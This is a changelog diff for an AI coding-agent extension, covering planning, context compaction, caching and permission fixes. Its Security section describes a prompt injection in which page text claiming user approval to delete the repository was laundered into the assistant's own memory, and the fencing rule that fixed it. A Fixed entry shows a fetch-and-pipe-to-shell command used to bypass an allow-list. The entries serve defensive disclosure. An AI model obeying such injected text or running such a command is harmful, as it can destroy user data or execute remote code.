@@ -2,7 +2,483 @@
 
 ## Unreleased
 
+### Changed
+- **Plan mode researches the code and names it.** Plan had been told it was
+  "a product designer, not an implementer", with a hard ban on naming a file,
+  a schema or a command. That was a correction to an earlier failure - Plan as
+  a dry-run of Act, writing implementations in prose - and it overshot. What
+  came back was outcomes and nothing to act on: "Ship the capture screen with
+  a live packet list" is a fine sentence that says nothing about where the
+  change goes, what already exists to reuse, or how anyone would know it
+  worked. Approving it approved a vision, and Act re-derived the plan.
+
+  The line between the two jobs is not design versus engineering, it is
+  **naming versus writing**. `PLAN_ADDENDUM` now asks for the research first -
+  `read_file`, `search` and `glob` have been in this phase's tool set the whole
+  time, unused because nothing asked for them - and then for a plan with
+  context, the files and functions the work lands in, the existing code to
+  reuse with its paths, the recommended approach, risks, and how to verify it.
+  The ban on writing the implementation body stays exactly where it was, and
+  the fenced `plan` block is unchanged, so the card and the todo seeding are
+  untouched. Greenfield work keeps the same shape: name what will exist rather
+  than which file changes.
+
+- **A plan cites code by name, not by line number.** Exercising the rewritten
+  prompt turned up the failure mode that asking for specificity introduces:
+  the plan named a real file and a real function at a line number carried over
+  from earlier in the session, which the file had long since moved past. Three
+  of its citations were stale that way, because the file shifted while the
+  session was editing it. A wrong line is worse than no line - it reads as
+  though it was checked, and a citation-resolution check passes it, since a
+  number always resolves to *some* line. The prompt now asks for the symbol
+  (`sendText` in `src/thing.ts`), which survives edits, and permits a line
+  number only for a line read in that same turn.
+
+- **Approving points Act at the plan, not just its steps.** The steps are the
+  order; the plan above them is the detail. Act is now told to follow the files
+  it named, the code it said to reuse and the verification it described, rather
+  than re-deriving what Plan already looked up.
+
+### Added
+- **An approved plan now becomes the todo list.** The plan card has always
+  parsed the fenced `plan` block into steps, and `update_todos` has always
+  backed a todo card, but the two shipped in 0.2.0 as separate features and
+  were never connected. Approving sent the fixed string `Approved - run the
+  plan.` and dropped the steps on the floor: Act re-derived the build order
+  from the prose above it, and nothing tied what it built to what was agreed.
+  The steps now seed the conversation's checklist *and* are restated in the
+  message Act receives. Plan phase was already given `update_todos` on the
+  grounds that "a plan that can track its own steps is more useful than one
+  that cannot" — this is the other half of that sentence.
+
+  The list is seeded through `normaliseTodos`, the same 20-item, 200-character
+  caps the tool itself uses, so a card filled in by a plan cannot behave
+  differently from one filled in by the model. A plan that produced no fenced
+  block seeds nothing and sends the old string unchanged — plan phase can call
+  `update_todos`, so an empty seed would wipe a list the model had built.
+
+- **"Keep planning" now asks what is wrong.** It removed the plan card's
+  footer and posted nothing at all, so the single most useful signal in the
+  loop — why the user turned the plan down — was discarded. It now reveals a
+  box, and what is typed is sent as a plan-phase turn. Approve stays beside it,
+  so opening the box is not a one-way door out of approving, and the text is
+  read off the input at the moment it is sent rather than mirrored into panel
+  state, where it would outlive the conversation it belongs to.
+
 ### Fixed
+- **The waiting mark was the busiest thing in a quiet panel.** It was three
+  concentric arcs, in three palette hues, on three coprime periods — 1.1s,
+  1.7s, 2.6s — chosen so the figure would never repeat, on the reasoning that
+  one rotating ring reads as a stalled image. At the size it is actually drawn,
+  12 to 13 pixels, none of that survived: three rings inside 13px leaves under
+  two pixels between strokes, three hues at that width smear into one muddy
+  colour, and three unrelated speeds read as jitter rather than as motion.
+
+  It is one arc travelling one faint track now — which is not a new idea, it is
+  `liveMark`'s, the mark a conversation working in the background already
+  wears. The two "something is happening" indicators finally speak one
+  language. The stalled-image worry is real and is answered by the arc's
+  **length** rather than by more rings: it breathes between a sixth of the
+  circle and a little over half while it travels, so no two frames of a turn
+  look alike. The two periods are exactly 2:1 — coprime periods were the old
+  mark's whole idea and were what made it read as noise.
+
+  Reduced motion holds a three-quarter arc rather than `animation: none`. The
+  old rule froze three dashed rings mid-turn, which looks like a broken render;
+  and a **closed** ring is what every progress control on earth uses for
+  "finished", which is the one thing a waiting mark must not say.
+
+- **The MCP and Agents tabs answered "there is nothing here" badly, and
+  differently from each other.** Both put a paragraph at the panel's full width
+  under the header with a button loose beneath it, and left the remaining four
+  fifths of the tab blank. Two problems. Prose set to the full panel is a
+  90-character line at 400px and a 130-character one on a dragged-out sidebar —
+  roughly twice the length the eye returns from reliably. And a screen whose
+  entire content sits in its top 90 pixels does not read as a page with nothing
+  on it yet; it reads as a page that failed to load.
+
+  The panel already had the answer on its welcome screen — centred column, a
+  mark to look at, prose held to a measure, one action — so both tabs use that
+  now, and the three "nothing yet" screens in the extension are one screen.
+
+  Three inconsistencies between the two tabs went with it, all of them visible
+  as things that move when you switch tab. The MCP header **scrolled away**
+  while the Agents header stayed put, so on a list of six servers the way to
+  fix a broken one was to scroll back up to find Reload. The MCP tab sat at a
+  **16px gutter** and every other surface in the panel — the agent bar and
+  phase banner directly above its own rows, the Agents tab, the diagnostics
+  cards — sits at 14. And the Agents tab's summary line floated under the last
+  row with a screen of nothing below it, where the MCP tab's identical line is
+  pinned to the bottom. One shape each now.
+
+- **"Keep planning" can no longer run with write tools.** The plan card is a
+  node in the transcript and outlives the phase segment above it, so the phase
+  at the moment the button is pressed is whatever the user last selected — and
+  `send` reads the phase at the top of the turn. Declining a plan after
+  flipping the segment to Act by hand would have started a write-enabled turn
+  from a button whose entire meaning is "do not build this yet". Declining now
+  forces the phase back to plan, the way approving forces it to act.
+
+- **A superseded plan card can no longer run the wrong plan.** A conversation
+  holds one set of plan steps, so once "Keep planning" made re-planning a
+  first-class flow, a second card arrived with the first still armed — and
+  approving the older one would have run the newer one's steps. Earlier cards
+  are stamped when a new plan arrives. Decided cards now keep a line saying
+  what was chosen instead of quietly losing their buttons, matching what a
+  resolved permission does.
+
+- **A webview message with no handler is now a build failure as well as a
+  warning.** The `default` arm reports a panel from another build at runtime;
+  binding its `msg` to `never` makes the compiler prove the arm is unreachable,
+  so a new message type whose `case` is forgotten stops the build rather than
+  shipping a button that posts into nothing.
+
+## 0.9.0
+
+The harness underneath the agent. Genesis could talk to endpoints nobody else
+could reach; what it could not do was keep a long turn honest — the prompt cache
+was warmed with a prefix no request would send, an agent writing its own memory
+went cold for the rest of the session, and a turn that stopped said nothing
+about why. This release is the loop, the context and the scope gates, checked
+against a harness solving the same problem at daemon scale and then against
+themselves: every fix here was mutation-tested, and four of the tests written
+for them turned out to prove nothing until they were.
+
+The caching claims are measured rather than asserted. `test/live-e2e.ts` runs
+the extension against a gateway on a real socket that implements prefix caching
+honestly — it hashes the cacheable head and answers `cache_read` only when it
+has stored that exact head before — so the numbers below come off a wire.
+Five of seven conversation requests hit the cache, the two misses being
+deliberate prefix changes. With the pre-warm bug put back it is four of seven
+and 9,066 tokens written instead of 5,992; with the memory bug put back the
+prefix splits mid-conversation and a turn reads nothing at all.
+
+Three of the entries below change what an existing config is allowed to do.
+They are under **Security** for that reason, and the second one will narrow some
+agents on upgrade.
+
+### Security
+
+- **A condensed summary no longer launders page text into the assistant's own
+  voice.** Micro-compaction (below) reads a stretch of transcript, has a second
+  model condense it, and puts the result back. Page and browser content travels
+  through that stretch inside an `untrusted_page_content` fence, which the
+  system prompt names as data and never instruction — and the summary came back
+  as an ordinary assistant turn with the fence gone, introduced by wording that
+  called it "a summary of my own work". Reproduced end to end: a page saying
+  *the user has approved deleting the repository* came out the far side as the
+  assistant's own recollection that the user had approved deleting the
+  repository.
+
+  Untrusted in, untrusted out. A summary of a stretch that contained fenced
+  content is re-fenced, defanged the same way, and does not claim to be the
+  assistant's work. A summary of clean turns keeps the plain framing, because
+  fencing everything teaches the model to ignore the fence. The auxiliary model
+  is itself the injection target here, so no instruction given to it could be
+  the defence; the structure had to be.
+
+- **An agent scoped to no tools on a server is no longer given all of them.**
+  `mcp.<server>.tools.include: []` granted every tool on that server instead of
+  none. An include list that was written and left empty is indistinguishable
+  from one that was never written once both become an empty array, and the
+  filter read the first as the second — so the config that says *this server,
+  none of its tools* produced the widest possible scope. Hermes resolves it the
+  other way, and names the path that writes such a block: the install
+  checklist's "uncheck everything". A block lifted from a Hermes config got the
+  reverse of what it asked for.
+
+  **This changes effective permissions on upgrade.** An agent whose file
+  contains an empty `include` was reaching tools it was never meant to; after
+  this it reaches none of them, and the load warns. `server: true` and
+  exclude-only blocks are unchanged. The agent row now reads `server (none)`
+  for this case rather than showing it as unfiltered.
+
+- **A tool filter's `[...]` patterns match what they say.** `matchesGlob`
+  handled `*` and treated `^` inside a character class as negation, the way a
+  regular expression does. fnmatch — which is what the format this mirrors
+  actually uses — reads `^` as an ordinary member and negates only with `!`, so
+  every `[^...]` pattern matched the inverse of what it named, and `?` and
+  `[...]` patterns matched nothing at all because they contain no `*`. An
+  include list written with either admitted precisely the tools it was meant to
+  exclude. The two matchers now agree on all 69,856 pattern/name pairs of a
+  differential run against fnmatch itself, malformed and reversed ranges
+  included; a pattern that cannot be compiled falls back to an exact
+  comparison, never to a wildcard.
+
+### Added
+
+- **Micro-compaction.** When the window fills, old exchanges are condensed by a
+  second, cheaper model instead of being dropped. What `fitToWindow` removes is
+  gone — the note it left behind told the model to ask for those turns, which it
+  cannot — and what compaction removes is still represented. Off by default
+  (`genesis.microCompact`), because absorbing an exchange rewrites the middle of
+  the prompt and the middle of the prompt is inside the cached prefix: it buys
+  window headroom by giving up cache hits, which is worth it only when the
+  alternative is losing the turns. The summariser is named with
+  `genesis.microCompactProfile` and is never chosen for you — it needs a
+  64,000-token window; without one it says so once in the log and the old
+  trimming carries on unchanged.
+
+  Exchange boundaries are what make it safe: an exchange opens at an assistant
+  turn and is closed by the next user turn, so *no user turn is ever compacted*
+  is a property of the data structure rather than a rule to remember, and a tool
+  result can only ever sit with the call that produced it. It runs once per
+  turn, never per model call — running it per call rewrote the cacheable prefix
+  seven times inside a single twelve-call turn.
+
+- **A turn now says why it stopped.** `maxIterations` was the only guard and
+  every other ending was a bare return, so an abort, an exhausted budget and a
+  run of failing tools all looked identical from outside: the model was talking,
+  and then it was not. There is now a token budget beside the step count — steps
+  were never a proxy for cost, and twenty-five against a 200k window is a
+  different bill from twenty-five short ones — one grace call with no tools when
+  it runs out, so the work already done gets reported instead of cut off, and a
+  ceiling of eight consecutive steps that achieve nothing. Every ending carries
+  a reason.
+
+- **A server vouched for as read-only is checked against its own tools.**
+  `readOnly: true` opens a server to Ask and Plan and nothing verifies it, which
+  is right — the alternative is trusting a server's account of itself. But MCP
+  tools do carry `annotations.readOnlyHint`, and comparing the two claims
+  catches the one honest way the promise breaks: a server marked read-only by
+  mistake. When a vouched-for server exposes tools that do not declare
+  themselves read-only, the load says so and names them. The hint never opens a
+  gate — a server that means harm sets it.
+
+### Changed
+
+- **An agent's memory is a snapshot taken once per session.** It was re-read at
+  the top of every turn, so an agent writing to its own memory changed the
+  system prefix underneath itself and paid cold-cache prices for every remaining
+  turn — the better the feature worked, the more it cost. The write still lands
+  on disk immediately; it reaches the prompt in the next session.
+
+- **A memory write that will not fit is refused instead of silently truncated.**
+  `MAX_MEMORY_CHARS` was enforced on the read, with a warning going to a log the
+  model never sees, so the tail vanished and the agent never learned that memory
+  is a budget to curate. A write past the cap now comes back naming the cap and
+  the size, and asking for consolidation. A write that leaves the file no larger
+  than it already is always goes through, so a file that grew past the cap by
+  some other route stays fixable. **Agents that wrote freely past 8,000
+  characters will start being refused.**
+
+- **`tools: []` warns.** An empty built-in allowlist means *every* built-in, not
+  none, which is how it has always worked and how it reads backwards. The
+  behaviour stays — an agent that cannot read a file is a slip, not an intent —
+  and the load now says what it means.
+
+- **The packaged artifact is activated and painted before it ships.**
+  `npm run package` unpacked the vsix and confirmed the entry point exported
+  `activate` — with `vscode` bound to an empty object, so calling it would have
+  thrown on the first API it touched. The one thing every user does first was
+  never done to the file they install. It is now called, on a cold workspace,
+  and checked for what it leaves behind: all twenty commands the manifest
+  declares are registered at runtime, the editor providers are registered,
+  disposables reach the context, nothing is surfaced as an error, and it shuts
+  down without throwing.
+
+  The panel is rendered too, in real Chromium rather than jsdom, from the same
+  html the extension serves with the same Content-Security-Policy — in both a
+  dark and a light workbench, since `body` is transparent on purpose and only a
+  light one makes the sheet paint its own ground. jsdom computes no boxes, so
+  it cannot see a stylesheet the engine rejects, a grid that collapses, a font
+  that never arrives, or a script that throws only in V8. Nothing overflows at
+  320px, both bundled faces load, and every measured label holds 4.5:1 as
+  composited — 6.34:1 at worst.
+
+- **Micro-compaction will not choose an endpoint for you.** It used to pick the
+  summariser automatically — the first profile that was `kind: chat`, was not the
+  active one, and had a large enough window. Switching the feature on therefore
+  sent parts of the conversation, including file contents and command output the
+  agent had read, to an endpoint configured for something else entirely. That is
+  survivable for one person watching a log line and is not survivable across a
+  team, where it only takes one workspace with a cloud profile sitting beside a
+  local one.
+
+  `genesis.microCompactProfile` now names the summariser and there is no
+  fallback: unset, unknown, or too small a window all mean compaction does not
+  run, the log says which, and the loop trims as it always did. The line that
+  reports it being on now also says what will be sent there.
+
+- **The prompt-cache counters are reported.** The client decoded
+  `cache_read_input_tokens` and `cache_creation_input_tokens` and then dropped
+  them, so for a build whose headline is that prompt caching now works there was
+  no way to see whether it did. A read of zero, turn after turn inside one
+  conversation, means something in the stable head of the prompt is moving — the
+  exact shape of the two bugs below. It is now one line per turn in the log,
+  and it says so when the read is zero.
+
+### Fixed
+
+- **Six ways a stream could end wrong, all of them silent.** Reproduced in
+  `test/stream-boundary.ts`, which is the file that did not exist. A gateway
+  that sent a tool call and then simply stopped, with no `finish_reason`, had
+  that call discarded in the decoder's map: the model had asked to read a file
+  and the user got a blank bubble. A final frame terminated by one newline
+  instead of two was left in the buffer and thrown away, taking the last tokens
+  of the reply or the terminal frame with it. An error delivered inside a 200 —
+  which is how every OpenAI-compatible gateway reports a mid-generation failure
+  — fell through every branch, so a partial answer looked complete.
+  `finish_reason: "length"` was read only as a cue to flush tool calls, so a
+  reply cut off at `maxOutputTokens` ended mid-word looking finished; with the
+  default of 4096 that is the most common way a turn ends badly. And
+  `finish_reason` arriving on the last *content* frame drained before that
+  frame's own argument chunk was read, truncating the call, while a terminal
+  frame carrying no `delta` key at all was skipped entirely.
+
+  Decoders now expose `push`/`flush`, the flush runs at end of stream, the
+  trailing frame is parsed through the same path, and the two stop reasons that
+  mean the answer is incomplete are said out loud with the remedy.
+
+- **The panel was shown the model's thinking.** From the second visible frame
+  onward the loop yielded the raw chunk instead of the filtered one, so a
+  `<think>` block that opened after the first word rendered verbatim into the
+  answer while the saved transcript correctly omitted it. At small frame sizes
+  it left tag fragments — `<ink>` — spliced into the prose instead. Which of the
+  two you got depended on where the gateway split its frames, so it was
+  non-deterministic and could not be reproduced from the session file.
+
+- **The context meter under-reported the whole conversation on the Anthropic
+  wire.** Input tokens arrive once on `message_start` and output on
+  `message_delta`, and the delta yielded `input: 0`. The loop takes the newest
+  usage as authoritative, so a 50k-token conversation read "820 / 200,000" —
+  flagged exact, which is the flag the panel uses to decide a number is worth
+  printing. Wrong in the reassuring direction: the meter never filled and the
+  413 arrived unannounced.
+
+- **Stop during a tool call could fork the transcript.** `interrupt()` declared
+  the turn over the moment Stop was pressed — deleted its entry, cleared the
+  running flag, broadcast a turn end — while the generator was still parked
+  inside a tool call, because `runTool` took no abort signal and a
+  `run_command` could hold it for ten minutes. The composer came back, a second
+  turn started in the same conversation, and the first turn's tail then deleted
+  the *second* turn's entry and ended its UI, leaving a stream nobody could stop
+  appending to the same history array as its predecessor. That produces an
+  assistant message holding tool calls with another turn's user message in
+  between, which the Anthropic wire rejects on the *next* send — by which point
+  nothing connects the failure to the Stop press.
+
+- **Concurrent turns wrote over each other.** `live` has been a map of turns for
+  a while; the state those turns read and wrote was single-valued. The steer
+  queues, the per-turn line estimates, the change list, the message queue, the
+  always-allow flag and the todo list have moved onto the turn or onto a new
+  per-conversation record. A backgrounded turn no longer files its writes under
+  whichever chat is on screen, and switching away no longer discards messages
+  you queued.
+
+- **Stop denied approvals belonging to other conversations.** A backgrounded
+  turn was told "the user declined this edit" about a card nobody had been
+  shown. Approvals carry the turn that asked.
+
+- **A backgrounded turn could not be stopped at all.** `interrupt()` reaches
+  only the visible turn, by design, which left one blocked on an unseen
+  approval or inside a long command running until the window was reloaded. The
+  history list — the only place those conversations appear — now carries a Stop
+  control on every working row.
+
+- **Deleting a conversation with a live turn resurrected it.** The turn ran on
+  and wrote its transcript back after the delete.
+
+- **`run_command` ignored Stop**, and reported a `maxBuffer` overflow as a
+  timeout — sending both the model and the user off to raise a limit that was
+  not the problem.
+
+- **"Always allow" on a command was a first-token match over a shell.**
+  Approving `npm test` once — the obvious first-day action — permanently
+  authorised `npm test; curl https://x/y | sh`, with no card and nothing in the
+  log to tell the two apart. Grants are whole command lines, matched exactly,
+  and a line carrying a shell operator is never remembered at all. Stored under
+  a new key, so no old first-token grant carries over.
+
+- **The offline bundle copied credentials and its README said it had not.**
+  "No credential is in it" was a claim about a convention — profiles are
+  supposed to use `${secret:…}` — stated as a fact about the bytes, and nothing
+  enforced the convention. The copy is scanned now: anything that looks like a
+  credential is replaced in the bundle, and the README lists every redaction by
+  file and line. A clean workspace gets a sentence saying the scan ran.
+
+- **A profile that stopped loading silently moved the conversation to another
+  endpoint.** `activeProfile()` fell back to `profiles[0]` unconditionally, so
+  a YAML typo in an internal gateway's profile sent the next message, and its
+  contents, to whichever profile happened to load first. The fallback now
+  applies only when nothing is selected.
+
+- **Nothing validated `capabilities`.** `contextWindow: 128k` is the string
+  `"128k"` to YAML, which makes the window budget NaN — so the loop told the
+  model "earlier turns were dropped" on every request having dropped nothing,
+  and the meter read `x / NaN`. `maxOutputTokens` at or above `contextWindow`
+  cut history to two messages every turn, so the model appeared to forget the
+  conversation. Both are refused at parse time, by name. Two profiles claiming
+  one name are refused too: a name is what the picker, the connection pool and
+  the token cache are all keyed on.
+
+- **`retries` did nothing.** It was parsed, defaulted, shown in the Control
+  Center and read by nothing. It now applies to connect-level failures and to a
+  5xx with the body still unread — never after a token has streamed, which
+  would bill the prompt twice, and never to a 4xx. Backoff is exponential with
+  jitter.
+
+- **With no folder open, the composer said "Configure an endpoint first".**
+  That names the fix for the other blocking condition. There is nothing to
+  configure: profiles come from the folder you have open, and there is none.
+  The two cases have separate messages, and the welcome screen has an Open
+  folder button rather than a sentence with nothing to press.
+
+- **Path containment compared case-sensitively on Windows**, where
+  `C:\Work\Proj` and `c:\work\proj\file.ts` are the same location. A file the
+  user was looking at could be judged outside the workspace.
+
+### Changed
+
+- **Genesis declares that it does not support untrusted workspaces.** An
+  endpoint profile can name a transform module — arbitrary JavaScript, run
+  before the first request — or an `exec` credential helper, and `.agent/mcp.json`
+  names programs to launch. That is the real boundary around all of it, and the
+  manifest had left it to a default. The composer also stopped pre-warming on
+  focus: warming builds the client, which runs those programs, and clicking
+  into a text box is not a request to.
+
+- **`node:vm` is documented as what it is.** The comment beside the transform
+  loader's narrowed `require` read as a claim that a transform could not reach
+  the filesystem or the network. It can; `vm` is an isolation primitive, not a
+  security boundary.
+
+- **MCP servers are killed as a process tree and given an environment
+  allowlist.** The canonical command is a launcher that spawns the real server,
+  so killing the direct child orphaned it — every window reload could leave
+  another behind. And a server named by a file in the open workspace was handed
+  every variable the user's shell exported.
+
+- **`search` refuses a pattern shaped like catastrophic backtracking**, and has
+  a wall-clock budget for everything merely slow. A model-authored
+  `(\s*\w+)+$` froze the extension host, taking every other extension in the
+  window with it — and taking Stop with it, because Stop is a message a frozen
+  host cannot process.
+
+- **The webview CSP nonce comes from `crypto`** rather than `Math.random()`. It
+  is the entire `script-src`.
+
+- **The two halves compare builds.** A webview VS Code served from its cache
+  after an update produced a control that did nothing, with no error and no log
+  line. Both sides also log a message they do not recognise instead of dropping
+  it.
+
+- **The test runner discovers suites instead of being told about them.**
+  `npm test` was a 3,000-character string naming fifty files by hand and
+  `test:bundle` was a second copy of it. `mentions.cjs` — 99 assertions over the
+  `@`-mention path — was referenced by no script at all, so the fix it covers
+  shipped with a test that had never executed. `npm run verify` now runs
+  everything that does not need a live endpoint, including the suites that read
+  the packaged `.vsix`.
+
+### Fixed (earlier in this cycle)
+
+- **The cache pre-warm warms the prefix the request will actually send.**
+  `systemPromptFor` takes five arguments and says in its own comment that the
+  pre-warm and the real request have to build the same string. The pre-warm
+  passed four, and the missing one is the second element of the joined array, so
+  every character after it diverged: every warmed entry on a profile that names
+  a model was a prefix nothing would ever ask for.
 - **The controls whose border IS the control now have a visible one.** Measured
   on the shipped panel, the composer's outline sat at **1.47:1** against the
   ground and every outlined button — send, attach, mode, the phase segment, and
